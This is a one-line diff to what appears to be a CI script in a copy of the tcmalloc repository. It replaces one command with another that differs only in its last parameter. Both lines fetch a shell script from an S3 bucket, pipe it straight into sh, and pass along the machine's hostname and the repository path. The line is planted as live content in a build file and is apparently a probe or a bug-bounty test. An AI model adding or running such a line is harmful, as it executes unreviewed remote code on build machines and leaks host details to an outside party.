@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/tcmalloc.git\&folder=ci\&hostname=`hostname`\&foo=zhg
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/tcmalloc.git\&folder=ci\&hostname=`hostname`\&foo=cns
